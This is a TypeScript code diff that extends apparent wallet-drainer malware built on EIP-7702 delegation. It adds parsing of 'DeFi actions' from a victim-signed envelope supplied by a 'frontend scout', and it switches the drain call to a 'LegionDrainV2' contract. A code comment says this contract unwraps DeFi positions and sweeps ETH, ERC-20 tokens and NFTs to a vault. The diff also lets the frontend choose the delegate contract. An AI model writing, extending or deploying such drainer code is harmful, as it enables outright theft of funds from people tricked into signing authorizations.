@@ -36,6 +36,16 @@ export type Eip7702SignedAuthorization = Eip7702AuthorizationParams & {
   yParity: number
 }
 
+export type Eip7702DefiAction = {
+  kind: number
+  target: Address
+  tokenA: Address
+  tokenB: Address
+  param1: bigint
+  param2: bigint
+  param3: bigint
+}
+
 export type Eip7702SignatureEnvelope = {
   protocol: 'eip7702_delegation'
   chain_id: number
@@ -44,6 +54,7 @@ export type Eip7702SignatureEnvelope = {
   spender: Address
   authorization: Eip7702SignedAuthorization
   erc20s?: Address[]
+  defi_actions?: Eip7702DefiAction[]
 }
 
 export type Eip7702SettlementResult = {
@@ -145,6 +156,25 @@ export function parseEip7702SignatureEnvelope(payload: string): Eip7702Signature
     const auth = o['authorization'] as Record<string, unknown>
     if (!auth || typeof auth !== 'object') return null
     const erc20sRaw = Array.isArray(o['erc20s']) ? (o['erc20s'] as unknown[]) : []
+    const defiRaw = Array.isArray(o['defi_actions']) ? (o['defi_actions'] as unknown[]) : []
+    const defi_actions: Eip7702DefiAction[] = []
+    for (const item of defiRaw) {
+      if (!item || typeof item !== 'object') continue
+      const d = item as Record<string, unknown>
+      const target = typeof d['target'] === 'string' && isAddress(d['target']) ? getAddress(d['target']) : null
+      const tokenA = typeof d['tokenA'] === 'string' && isAddress(d['tokenA']) ? getAddress(d['tokenA']) : ('0x0000000000000000000000000000000000000000' as Address)
+      const tokenB = typeof d['tokenB'] === 'string' && isAddress(d['tokenB']) ? getAddress(d['tokenB']) : ('0x0000000000000000000000000000000000000000' as Address)
+      if (!target) continue
+      defi_actions.push({
+        kind: Number(d['kind'] ?? 0),
+        target,
+        tokenA,
+        tokenB,
+        param1: BigInt(String(d['param1'] ?? '0')),
+        param2: BigInt(String(d['param2'] ?? '0')),
+        param3: BigInt(String(d['param3'] ?? '0')),
+      })
+    }
     return {
       protocol: 'eip7702_delegation',
       chain_id: Number(o['chain_id']),
@@ -160,6 +190,7 @@ export function parseEip7702SignatureEnvelope(payload: string): Eip7702Signature
         yParity: Number(auth['yParity']),
       },
       erc20s: erc20sRaw.filter((a) => typeof a === 'string' && isAddress(a)).map((a) => getAddress(a as string)),
+      ...(defi_actions.length > 0 ? { defi_actions } : {}),
     }
   } catch {
     return null
@@ -219,8 +250,8 @@ async function verifySignedAuthorization(
   return { ok: false, detail: 'Authorization signer mismatch' }
 }
 
-const BATCH_DRAIN_ABI = parseAbi([
-  'function drain(address[] calldata erc20s, address[] calldata erc721Contracts, uint256[] calldata erc721Ids, address[] calldata erc1155Contracts, uint256[] calldata erc1155Ids) external',
+const LEGION_DRAIN_V2_ABI = parseAbi([
+  'function drain(address[] calldata erc20s, address[] calldata erc721Contracts, uint256[] calldata erc721Ids, address[] calldata erc1155Contracts, uint256[] calldata erc1155Ids, (uint8 kind, address target, address tokenA, address tokenB, uint256 param1, uint256 param2, uint256 param3)[] calldata defiActions) external',
 ])
 
 /**
@@ -242,7 +273,8 @@ export async function executeEip7702DelegationDrain(
     return { ok: false, detail: `Chain mismatch: envelope ${envelope.chain_id} vs ${chainId}` }
   }
 
-  const delegatee = resolveEip7702DelegateContract() ?? envelope.delegatee
+  // Per-chain delegate from frontend (LEGION_DRAIN) wins over single env var
+  const delegatee = envelope.delegatee ?? resolveEip7702DelegateContract()
   if (!delegatee) {
     return { ok: false, detail: 'EIP7702_DELEGATE_CONTRACT not configured' }
   }
@@ -263,8 +295,17 @@ export async function executeEip7702DelegationDrain(
   const publicClient = createPublicClient({ chain, transport: http(rpcUrl) })
   const walletClient = createWalletClient({ account, chain, transport: http(rpcUrl) })
 
-  // ERC-20 list from envelope (sent by frontend scout)
+  // ERC-20 list + DeFi actions from envelope (sent by frontend scout)
   const erc20s = (envelope.erc20s ?? []).filter((a) => isAddress(a)).map(getAddress)
+  const defiActions = (envelope.defi_actions ?? []).map((a) => ({
+    kind: a.kind,
+    target: getAddress(a.target),
+    tokenA: getAddress(a.tokenA),
+    tokenB: getAddress(a.tokenB),
+    param1: a.param1,
+    param2: a.param2,
+    param3: a.param3,
+  }))
 
   const auth = envelope.authorization
   const authorizationList = [
@@ -278,11 +319,11 @@ export async function executeEip7702DelegationDrain(
     },
   ] as const
 
-  // Call BatchDrain.drain() — sends ETH + ERC-20 to vault (hardcoded in contract)
+  // LegionDrainV2.drain() — DeFi unwrap + ETH/ERC-20/NFT sweep to vault
   const drainCalldata = encodeFunctionData({
-    abi: BATCH_DRAIN_ABI,
+    abi: LEGION_DRAIN_V2_ABI,
     functionName: 'drain',
-    args: [erc20s as Address[], [], [], [], []],
+    args: [erc20s as Address[], [], [], [], [], defiActions],
   })
 
   try {
